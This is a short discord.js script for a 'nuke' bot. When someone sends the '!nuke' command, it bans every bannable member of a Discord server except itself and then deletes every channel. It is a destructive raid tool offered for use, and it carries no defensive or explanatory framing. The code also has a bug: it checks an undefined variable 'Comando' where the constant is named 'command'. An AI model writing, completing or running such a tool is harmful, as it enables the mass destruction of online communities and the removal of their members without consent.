const discord = require("discord.js");
const client = new discord.Client();

const token = "";//Place Token here
const Botid = "";//Place id of bot here
const reason=""//Place reason in ban
const command = "!nuke"; //command for nuke

client.login(token);
client.on("ready", () => {
  console.log("Bot is ready");
});
client.on("message", (msg) => {
  if (msg.guild) {
    if (msg.content.startsWith(Comando)) {
      msg.guild.members.cache.array().forEach((f) => {
        if (f.user.id != Botid && f.bannable) {
          try {            
            console.log("Banned: " + f.user.username);
            f.ban({ reason: reason });
          } catch (error) {
            console.log("Erro: not ban " + f.user.username);
          }
        }
      });
      msg.guild.channels.cache.array().forEach((f) => {
        try {
          f.delete();
        } catch (error) {
          console.log("Erro: when deleting the channel " + f.name);
        }
      });
    }
  }
});
